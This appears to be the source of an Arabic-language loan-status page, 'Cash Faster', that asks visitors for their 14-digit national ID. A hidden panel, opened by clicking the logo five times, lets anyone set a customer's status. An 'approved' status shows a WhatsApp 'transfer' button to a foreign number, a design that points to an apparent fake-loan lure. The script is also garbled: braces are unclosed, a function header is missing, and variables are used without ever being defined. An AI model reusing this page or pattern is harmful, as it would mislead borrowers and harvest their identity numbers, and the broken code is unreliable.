<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
<title>Cash Faster | الاستعلام الفوري عن طلب العميل</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  :root {
    --primary: #1A8C4A; --primary-light: #E8F5EE; --primary-dark: #0F6B38;
    --gold: #B8912E; --gold-light: #FBF6E8; --gold-dark: #8E6F1F;
    --bg: #F7F9FB; --bg-card: #FFFFFF; --bg-soft: #F0F4F8;
    --text: #1A2332; --text-muted: #6B7A8F; --border: #E1E8F0;
    --shadow-sm: 0 2px 8px rgba(26,35,50,0.04);
    --shadow-lg: 0 16px 48px rgba(26,35,50,0.12);
    --success: #16A34A; --success-light: #DCFCE7;
    --info: #2563EB; --info-light: #DBEAFE;
    --warning: #D97706; --warning-light: #FEF3C7;
    --danger: #DC2626; --danger-light: #FEE2E2;
    --purple: #7C3AED; --purple-light: #EDE9FE;
    --etisalat-blue: #0284C7; --etisalat-light: #E0F2FE;
    --review-color: #D97706; --invalid-color: #DC2626;
    --pending-approval: #7C3AED; --pending-light: #EDE9FE;
    --font: 'Cairo', sans-serif; --radius: 1.4rem; --radius-sm: 0.9rem;
  }
  body { font-family: var(--font); background: var(--bg); color: var(--text); min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 1rem; position: relative; overflow-x: hidden; line-height: 1.7; }
  .watermark { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; overflow: hidden; display: flex; align-items: center; justify-content: center; }
  .watermark::before { content: 'CASH FASTER'; position: absolute; font-size: 9rem; font-weight: 900; color: rgba(26,140,74,0.045); letter-spacing: 0.3rem; transform: rotate(-32deg); white-space: nowrap; font-family: var(--font); }
  .watermark::after { content: 'CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER'; position: absolute; font-size: 1.6rem; font-weight: 800; color: rgba(184,145,46,0.04); letter-spacing: 0.2rem; transform: rotate(-32deg); white-space: nowrap; line-height: 5rem; width: 200%; text-align: center; font-family: var(--font); }
  .app-container { max-width: 480px; width: 100%; background: var(--bg-card); border-radius: 2rem; padding: 1.4rem 1.2rem; box-shadow: var(--shadow-lg); border: 1px solid var(--border); position: relative; z-index: 1; margin-bottom: 1rem; }
  .promo-strip { background: linear-gradient(135deg, var(--primary-light), var(--gold-light)); border: 1px solid rgba(26,140,74,0.12); border-radius: 3rem; padding: 0.55rem 1.2rem; margin-bottom: 1.2rem; text-align: center; font-size: 0.72rem; color: var(--primary-dark); display: flex; align-items: center; justify-content: center; gap: 0.5rem; flex-wrap: wrap; font-weight: 600; }
  .promo-strip i { color: var(--primary); }
  .promo-strip .highlight { color: var(--gold-dark); font-weight: 800; }
  .header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 1rem; border-bottom: 1px solid var(--border); }
  .brand { display: flex; align-items: center; gap: 0.7rem; cursor: pointer; }
  .brand .icon { width: 48px; height: 48px; background: linear-gradient(135deg, var(--primary), var(--primary-dark)); border-radius: 14px; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; color: #FFFFFF; box-shadow: 0 6px 20px rgba(26,140,74,0.25); }
  .brand h1 { font-size: 1.4rem; font-weight: 900; color: var(--text); letter-spacing: 0.3px; line-height: 1.2; }
  .brand h1 span { color: var(--gold); display: block; font-size: 0.7rem; letter-spacing: 2px; font-weight: 700; margin-top: 1px; }
  .header .badge { background: var(--success-light); border: 1px solid rgba(22,163,74,0.2); border-radius: 3rem; padding: 0.35rem 0.9rem; font-size: 0.65rem; color: var(--success); display: flex; align-items: center; gap: 0.4rem; font-weight: 700; }
  .header .badge i { font-size: 0.45rem; animation: dotPulse 1.8s ease-in-out infinite; }
  @keyframes dotPulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
  .nav-tabs { display: flex; gap: 0.4rem; margin: 1.1rem 0; background: var(--bg-soft); border-radius: 3rem; padding: 0.35rem; }
  .nav-tabs .tab { flex: 1; text-align: center; padding: 0.55rem 0.3rem; border-radius: 3rem; font-size: 0.65rem; font-weight: 700; color: var(--text-muted); display: flex; align-items: center; justify-content: center; gap: 0.35rem; }
  .nav-tabs .tab.active { background: var(--bg-card); color: var(--primary-dark); box-shadow: var(--shadow-sm); }
  .search-box { display: flex; gap: 0.6rem; margin: 0.9rem 0 1.3rem 0; }
  .search-box input { flex: 1; padding: 0.95rem 1.2rem; border-radius: 3rem; border: 2px solid var(--border); background: var(--bg-soft); color: var(--text); font-size: 0.95rem; text-align: center; font-family: var(--font); font-weight: 600; letter-spacing: 1px; }
  .search-box input:focus { outline: none; border-color: var(--primary); background: #FFFFFF; box-shadow: 0 0 0 4px rgba(26,140,74,0.1); }
  .search-box button { padding: 0.95rem 1.6rem; border: none; border-radius: 3rem; background: linear-gradient(135deg, var(--primary), var(--primary-dark)); color: #FFFFFF; font-weight: 800; cursor: pointer; font-family: var(--font); font-size: 0.9rem; display: flex; align-items: center; gap: 0.5rem; box-shadow: 0 6px 20px rgba(26,140,74,0.25); white-space: nowrap; }
  .loan-card { background: linear-gradient(145deg, #FFFFFF, #FAFCFE); border-radius: var(--radius); padding: 1.5rem 1.2rem; border: 1px solid var(--border); margin-bottom: 1rem; box-shadow: var(--shadow-sm); }
  .loan-card .loan-label { font-size: 0.7rem; color: var(--text-muted); letter-spacing: 1.5px; text-align: center; font-weight: 700; }
  .loan-card .loan-amount-main { text-align: center; font-size: 2.8rem; font-weight: 900; color: var(--primary-dark); margin: 0.3rem 0; line-height: 1.1; }
  .loan-card .loan-amount-main .currency { font-size: 1.2rem; color: var(--text-muted); font-weight: 700; }
  .loan-card .loan-percent { text-align: center; font-size: 0.85rem; color: var(--success); font-weight: 800; margin-bottom: 0.8rem; }
  .loan-details-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 0.6rem; margin-top: 1rem; padding-top: 1rem; border-top: 1px dashed var(--border); }
  .loan-details-grid .detail-item { text-align: center; background: var(--bg-soft); border-radius: var(--radius-sm); padding: 0.6rem 0.3rem; }
  .loan-details-grid .detail-item .label { font-size: 0.55rem; color: var(--text-muted); font-weight: 700; }
  .loan-details-grid .detail-item .value { font-size: 0.88rem; font-weight: 800; color: var(--text); margin-top: 0.2rem; }
  .loan-details-grid .detail-item .value.gold { color: var(--gold-dark); }
  .loan-details-grid .detail-item .value.green { color: var(--success); }
  .loan-details-grid .detail-item .value.warning { color: var(--warning); }
  .status-bar { display: flex; align-items: center; gap: 0.8rem; background: var(--bg-card); border-radius: var(--radius); padding: 0.9rem 1.1rem; border: 1px solid var(--border); margin: 0.9rem 0; box-shadow: var(--shadow-sm); }
  .status-bar .status-icon { width: 42px; height: 42px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1rem; flex-shrink: 0; }
  .status-bar .status-text { flex: 1; }
  .status-bar .status-text .main { font-weight: 800; font-size: 0.9rem; line-height: 1.3; }
  .status-bar .status-text .sub { font-size: 0.68rem; color: var(--text-muted); margin-top: 0.15rem; }
  .status-bar .status-badge { border-radius: 3rem; padding: 0.2rem 0.7rem; font-size: 0.6rem; font-weight: 700; }
  .status-bar.approved { border-color: rgba(22,163,74,0.25); background: linear-gradient(135deg, #FFFFFF, var(--success-light)); }
  .status-bar.approved .status-icon { background: var(--success-light); color: var(--success); }
  .status-bar.approved .status-text .main { color: var(--success); }
  .status-bar.approved .status-badge { background: var(--success-light); border: 1px solid rgba(22,163,74,0.25); color: var(--success); }
  .status-bar.review { border-color: rgba(217,119,6,0.25); background: linear-gradient(135deg, #FFFFFF, var(--warning-light)); }
  .status-bar.review .status-icon { background: var(--warning-light); color: var(--warning); }
  .status-bar.review .status-text .main { color: var(--warning); }
  .status-bar.review .status-badge { background: var(--warning-light); border: 1px solid rgba(217,119,6,0.25); color: var(--warning); }
  .status-bar.rejected { border-color: rgba(220,38,38,0.25); background: linear-gradient(135deg, #FFFFFF, var(--danger-light)); }
  .status-bar.rejected .status-icon { background: var(--danger-light); color: var(--danger); }
  .status-bar.rejected .status-text .main { color: var(--danger); }
  .status-bar.rejected .status-badge { background: var(--danger-light); border: 1px solid rgba(220,38,38,0.25); color: var(--danger); }
  .status-bar.invalid { border-color: rgba(220,38,38,0.25); background: linear-gradient(135deg, #FFFFFF, var(--danger-light)); }
  .status-bar.invalid .status-icon { background: var(--danger-light); color: var(--invalid-color); }
  .status-bar.invalid .status-text .main { color: var(--invalid-color); }
  .status-bar.invalid .status-badge { background: var(--danger-light); border: 1px solid rgba(220,38,38,0.25); color: var(--invalid-color); }
  .status-bar.pending-approval { border-color: rgba(124,58,237,0.25); background: linear-gradient(135deg, #FFFFFF, var(--pending-light)); }
  .status-bar.pending-approval .status-icon { background: var(--pending-light); color: var(--pending-approval); }
  .status-bar.pending-approval .status-text .main { color: var(--pending-approval); }
  .status-bar.pending-approval .status-badge { background: var(--pending-light); border: 1px solid rgba(124,58,237,0.25); color: var(--pending-approval); }
  .client-info { background: var(--bg-card); border-radius: var(--radius); padding: 1rem 1.2rem; border: 1px solid var(--border); margin: 0.9rem 0; box-shadow: var(--shadow-sm); }
  .client-info .info-title { font-size: 0.75rem; font-weight: 800; color: var(--text-muted); margin-bottom: 0.6rem; display: flex; align-items: center; gap: 0.5rem; }
  .client-info .info-title i { color: var(--primary); }
  .client-info .row { display: flex; justify-content: space-between; padding: 0.55rem 0; border-bottom: 1px solid var(--border); font-size: 0.85rem; gap: 0.5rem; }
  .client-info .row:last-child { border-bottom: none; }
  .client-info .row .key { color: var(--text-muted); font-weight: 600; flex-shrink: 0; }
  .client-info .row .value { font-weight: 700; text-align: left; color: var(--text); word-break: break-word; }
  .client-info .row .value.gold { color: var(--gold-dark); }
  .client-info .row .value.green { color: var(--success); }
  .client-info .row .value.review { color: var(--review-color); }
  .client-info .row .value.pending-approval { color: var(--pending-approval); }
  .id-verification { background: linear-gradient(135deg, #FFFFFF, var(--gold-light)); border: 2px solid var(--gold); border-radius: var(--radius); padding: 1.1rem; margin: 0.9rem 0; }
  .id-verification .idv-header { display: flex; align-items: center; gap: 0.6rem; margin-bottom: 0.8rem; padding-bottom: 0.6rem; border-bottom: 1px solid rgba(184,145,46,0.2); }
  .id-verification .idv-header .idv-icon { width: 38px; height: 38px; background: linear-gradient(135deg, var(--gold), var(--gold-dark)); border-radius: 10px; display: flex; align-items: center; justify-content: center; color: #FFFFFF; font-size: 1rem; flex-shrink: 0; }
  .id-verification .idv-header h4 { font-size: 0.9rem; font-weight: 800; color: var(--gold-dark); }
  .id-verification .idv-header p { font-size: 0.68rem; color: var(--text-muted); margin-top: 0.1rem; }
  .id-verification .idv-image-box { background: #FFFFFF; border: 1px dashed var(--gold); border-radius: var(--radius-sm); padding: 0.6rem; text-align: center; overflow: hidden; }
  .id-verification .idv-image-box img { max-width: 100%; height: auto; border-radius: 0.6rem; display: block; margin: 0 auto; max-height: 320px; object-fit: contain; }
  .id-verification .idv-image-box .idv-placeholder { padding: 1.5rem 0.5rem; color: var(--text-muted); font-size: 0.78rem; font-weight: 600; }
  .id-verification .idv-caption { font-size: 0.68rem; color: var(--text-muted); text-align: center; margin-top: 0.5rem; font-weight: 600; }
  .status-message-box { border-radius: var(--radius); padding: 1.1rem; margin: 0.9rem 0; text-align: center; }
  .status-message-box .status-icon { font-size: 2.5rem; display: block; margin-bottom: 0.5rem; }
  .status-message-box h3 { font-size: 1.05rem; font-weight: 800; margin-bottom: 0.3rem; }
  .status-message-box p { font-size: 0.82rem; line-height: 1.9; color: var(--text-muted); }
  .status-message-box.approved { background: linear-gradient(135deg, #FFFFFF, var(--success-light)); border: 2px solid var(--success); }
  .status-message-box.approved h3 { color: var(--success); }
  .status-message-box.review { background: linear-gradient(135deg, #FFFFFF, var(--warning-light)); border: 2px solid var(--warning); }
  .status-message-box.review h3 { color: var(--warning); }
  .status-message-box.rejected { background: linear-gradient(135deg, #FFFFFF, var(--danger-light)); border: 2px solid var(--danger); }
  .status-message-box.rejected h3 { color: var(--danger); }
  .status-message-box.invalid { background: linear-gradient(135deg, #FFFFFF, var(--danger-light)); border: 2px solid var(--invalid-color); }
  .status-message-box.invalid h3 { color: var(--invalid-color); }
  .status-message-box.pending-approval { background: linear-gradient(135deg, #FFFFFF, var(--pending-light)); border: 2px solid var(--pending-approval); }
  .status-message-box.pending-approval h3 { color: var(--pending-approval); }
  .wallet-notice { border-radius: var(--radius); padding: 1.1rem; margin: 0.9rem 0; }
  .wallet-notice .notice-head { display: flex; align-items: center; gap: 0.7rem; margin-bottom: 0.5rem; }
  .wallet-notice .notice-head i { font-size: 1.6rem; flex-shrink: 0; }
  .wallet-notice .notice-head h4 { font-size: 0.9rem; font-weight: 800; }
  .wallet-notice p { color: var(--text-muted); font-size: 0.78rem; line-height: 1.9; }
  .wallet-notice.etisalat { background: linear-gradient(135deg, #FFFFFF, var(--etisalat-light)); border: 2px solid var(--etisalat-blue); }
  .wallet-notice.etisalat .notice-head i, .wallet-notice.etisalat .notice-head h4 { color: var(--etisalat-blue); }
  .wallet-notice.none { background: linear-gradient(135deg, #FFFFFF, var(--gold-light)); border: 2px solid var(--gold); }
  .wallet-notice.none .notice-head i, .wallet-notice.none .notice-head h4 { color: var(--gold-dark); }
  .btn-whatsapp-transfer { width: 100%; padding: 1rem 1.2rem; border: none; border-radius: 3rem; background: linear-gradient(135deg, #25D366, #128C7E); color: #FFFFFF; font-weight: 800; font-size: 0.95rem; display: flex; align-items: center; justify-content: center; gap: 0.7rem; cursor: pointer; box-shadow: 0 8px 28px rgba(37,211,102,0.3); margin-top: 0.8rem; font-family: var(--font); animation: pulseWhatsApp 2s ease-in-out infinite; }
  @keyframes pulseWhatsApp { 0%,100% { box-shadow: 0 8px 28px rgba(37,211,102,0.3); transform: scale(1); } 50% { box-shadow: 0 8px 42px rgba(37,211,102,0.5); transform: scale(1.015); } }
  .btn-whatsapp-transfer i { font-size: 1.3rem; }
  .btn-whatsapp-transfer .badge-new { background: rgba(255,255,255,0.22); border-radius: 3rem; padding: 0.1rem 0.6rem; font-size: 0.6rem; font-weight: 800; }
  .btn-whatsapp-transfer.etisalat-btn { background: linear-gradient(135deg, #0284C7, #0369A1); }
  .btn-whatsapp-transfer.gold-btn { background: linear-gradient(135deg, var(--gold), var(--gold-dark)); color: #FFFFFF; }
  .error-box { background: var(--danger-light); border: 1px solid rgba(220,38,38,0.2); border-radius: var(--radius); padding: 1.2rem; text-align: center; color: var(--danger); font-size: 0.85rem; display: none; margin-top: 0.8rem; font-weight: 600; line-height: 1.8; }
  .error-box i { font-size: 1.8rem; display: block; margin-bottom: 0.4rem; }
  .loader { text-align: center; display: none; padding: 1.5rem 0; }
  .loader i { color: var(--primary); font-size: 2rem; }
  .loader p { color: var(--text-muted); font-size: 0.8rem; margin-top: 0.4rem; font-weight: 600; }
  .admin-panel { display: none; background: var(--bg-soft); border-radius: var(--radius); padding: 1rem; margin: 0.8rem 0; border: 1px solid var(--border); }
  .admin-panel.show { display: block; }
  .admin-panel .admin-title { font-size: 0.85rem; color: var(--gold-dark); font-weight: 800; margin-bottom: 0.7rem; text-align: center; }
  .admin-panel .btn-group { display: flex; gap: 0.4rem; flex-wrap: wrap; }
  .admin-panel .btn-group button { flex: 1; min-width: 90px; padding: 0.5rem 0.6rem; border: none; border-radius: 3rem; font-size: 0.7rem; font-weight: 700; cursor: pointer; font-family: var(--font); color: #FFFFFF; }
  .btn-status-approved { background: var(--success); }
  .btn-status-review { background: var(--warning); }
  .btn-status-rejected { background: var(--danger); }
  .btn-status-invalid { background: var(--invalid-color); }
  .btn-status-pending-approval { background: var(--pending-approval); }
  .admin-status-current { font-size: 0.7rem; color: var(--text-muted); text-align: center; margin-top: 0.5rem; font-weight: 600; }
  @media (max-width: 440px) {
    body { padding: 0.6rem; }
    .app-container { padding: 1rem 0.9rem; border-radius: 1.6rem; }
    .watermark::before { font-size: 5rem; }
    .watermark::after { font-size: 1rem; line-height: 3rem; }
    .loan-card .loan-amount-main { font-size: 2.2rem; }
    .search-box { flex-direction: column; }
    .search-box button { width: 100%; justify-content: center; }
    .brand h1 { font-size: 1.15rem; }
    .brand .icon { width: 42px; height: 42px; font-size: 1.3rem; }
    .client-info .row { font-size: 0.78rem; }
  }
</style>
</head>
<body>

  <div class="watermark"></div>

  <div class="app-container">

    <div class="promo-strip">
      <i class="fas fa-shield-alt"></i>
      <span>💰 تمويل آمن وشفاف | <span class="highlight">بدون أي رسوم مسبقة</span></span>
      <i class="fas fa-lock" style="color: var(--success);"></i>
    </div>

    <div class="header">
      <div class="brand" id="brandLogo">
        <div class="icon"><i class="fas fa-bolt"></i></div>
        <h1>Cash Faster<span>كاش فاستر</span></h1>
      </div>
      <div class="badge">
        <i class="fas fa-circle"></i>
        <span>🟢 نشط</span>
      </div>
    </div>

    <div class="nav-tabs">
      <div class="tab active"><i class="fas fa-search"></i> 🔍 استعلام عن الطلب</div>
      <div class="tab"><i class="fas fa-list-check"></i> 📋 خطوات التسييل</div>
      <div class="tab"><i class="fas fa-shield-halved"></i> 🛡️ شفافية وأمان</div>
    </div>

    <div class="search-box">
      <input type="text" id="nationalId" placeholder="🔢 أدخل الرقم القومي (14 رقم)" maxlength="14" inputmode="numeric">
      <button onclick="searchCustomer()"><i class="fas fa-search"></i> 🔍 استعلام</button>
    </div>

    <div id="resultArea"></div>

    <div class="error-box" id="errorBox">
      <i class="fas fa-circle-info"></i>
      <p>⚠️ لم نجد طلبًا مسجلًا بهذا الرقم القومي.<br>💡 يرجى التأكد من الرقم أو التواصل مع خدمة العملاء.</p>
    </div>

    <div class="loader" id="loader">
      <i class="fas fa-spinner fa-pulse"></i>
      <p>⏳ جاري جلب بيانات طلبك...</p>
    </div>

    <div class="admin-panel" id="adminPanel">
      <div class="admin-title"><i class="fas fa-cog"></i> ⚙️ تغيير حالة الطلب</div>
      <div class="btn-group">
        <button class="btn-status-approved" onclick="changeStatus('approved')">✅ موافقة</button>
        <button class="btn-status-review" onclick="changeStatus('review')">⏳ مراجعة</button>
        <button class="btn-status-rejected" onclick="changeStatus('rejected')">❌ رفض</button>
        <button class="btn-status-invalid" onclick="changeStatus('invalid')">⚠️ بيانات غير صحيحة</button>
        <button class="btn-status-pending-approval" onclick="changeStatus('pending-approval')">🔄 قيد الموافقة</button>
      </div>
      <div class="admin-status-current" id="adminStatusDisplay">الحالة الحالية: <span id="currentStatusText">غير محدد</span></div>
    </div>

  </div>

<script>
  const WHATSAPP_NUMBER = "+12519108713";
  const WHATSAPP_URL = `https://wa.me/${WHATSAPP_NUMBER}`;

  // ================================================================
  //  قاعدة البيانات — تم إزالة كل الأرقام الناقصة والخاصة بفودافون

  function calculateTotal(client) {
    let totalDisplay = client.total || "يحدد لاحقاً";
    if (client.loan && client.loanTerm) {
      const termMatch = String(client.loanTerm).match(/(\d+)/);
      if (termMatch) {
        const months = parseInt(termMatch[0]);
        if (months > 0 && client.installment) {

          if (!isNaN(installmentNum)) {

        }
      }

    return totalDisplay;
  }

    const status = client.status || 'pending-approval';
    const statusMap = {
      'approved': { class: 'approved', icon: 'fa-circle-check', main: '✅ تمت الموافقة النهائية!', sub: '💚 تم اعتماد طلب التمويل الخاص بك بنجاح', badge: '✅ معتمد' },
      'review': { class: 'review', icon: 'fa-clock', main: '⏳ طلبك قيد المراجعة', sub: '💡 يرجى متابعة طلبك من حين لآخر', badge: '⏳ قيد المراجعة' },
      'rejected': { class: 'rejected', icon: 'fa-circle-xmark', main: '❌ تم رفض طلبك', sub: '😔 نأسف، لم تتم الموافقة على طلب التمويل', badge: '❌ مرفوض' },
      'invalid': { class: 'invalid', icon: 'fa-triangle-exclamation', main: '⚠️ بيانات غير صحيحة', sub: '✏️ يرجى تحديث بياناتك وإعادة التقديم', badge: '⚠️ بيانات غير صحيحة' },
      'pending-approval': { class: 'pending-approval', icon: 'fa-arrows-rotate', main: '🔄 جارى حصولك على الموافقة', sub: '💡 يرجى متابعة طلبك من حين لآخر', badge: '🔄 قيد الموافقة النهائية' }
    };
    const s = statusMap[status] || statusMap['pending-approval'];
    html += `
      <div class="status-bar ${s.class}">
        <div class="status-icon"><i class="fas ${s.icon}"></i></div>
        <div class="status-text">
          <div class="main">${s.main}</div>
          <div class="sub">${s.sub}</div>
        </div>
        <div class="status-badge">${s.badge}</div>
      </div>
    `;
    html += buildStatusMessage(client);
    html += buildWalletNotice(client);
    if (status === 'approved') {
      html += createTransferButton(client);
    }
    resultArea.innerHTML = html;
    document.getElementById('errorBox').style.display = 'none';
  }

  function toggleAdmin() {
    isAdmin = !isAdmin;
    document.getElementById('adminPanel').classList.toggle('show', isAdmin);
  }

  function updateAdminStatus(status) {
    const statusMap = { 'approved': '✅ موافقة', 'review': '⏳ قيد المراجعة', 'rejected': '❌ مرفوض', 'invalid': '⚠️ بيانات غير صحيحة', 'pending-approval': '🔄 قيد الموافقة' };
    const el = document.getElementById('currentStatusText');
    if (el) el.textContent = statusMap[status] || 'غير محدد';
  }

  function changeStatus(newStatus) {
    if (!currentClient || !currentNationalId) { alert('⚠️ يرجى البحث عن عميل أولاً.'); return; }
    if (customersDatabase[currentNationalId]) {
      customersDatabase[currentNationalId].status = newStatus;
      currentClient.status = newStatus;
      updateAdminStatus(newStatus);
      displayResult(customersDatabase[currentNationalId], currentNationalId);
      alert(`✅ تم تغيير حالة العميل ${currentClient.name} إلى "${newStatus}" بنجاح.`);
    }
  }

  function searchCustomer() {
    const nationalId = document.getElementById('nationalId').value.trim();
    if (!nationalId) { alert('⚠️ الرجاء إدخال الرقم القومي'); return; }
    if (nationalId.length !== 14) { alert('⚠️ الرقم القومي يجب أن يكون 14 رقمًا'); return; }
    document.getElementById('loader').style.display = 'block';
    document.getElementById('resultArea').innerHTML = '';
    document.getElementById('errorBox').style.display = 'none';
    setTimeout(() => {
      document.getElementById('loader').style.display = 'none';
      const found = customersDatabase[nationalId];
      if (found) {
        found.id = nationalId;
        displayResult(found, nationalId);
      } else {
        document.getElementById('errorBox').style.display = 'block';
        currentClient = null;
        currentNationalId = '';
        updateAdminStatus('غير محدد');
      }
    }, 800);
  }

  document.getElementById('brandLogo')?.addEventListener('click', function() {
    adminClickCount++;
    if (adminClickCount >= 5) { toggleAdmin(); adminClickCount = 0; }
    setTimeout(() => { adminClickCount = 0; }, 3000);
  });

  document.getElementById('nationalId')?.addEventListener('keypress', e => {
    if (e.key === 'Enter') searchCustomer();
  });

  window.searchCustomer = searchCustomer;
  window.changeStatus = changeStatus;
  window.openWhatsApp = openWhatsApp;
</script>

</body>
</html>
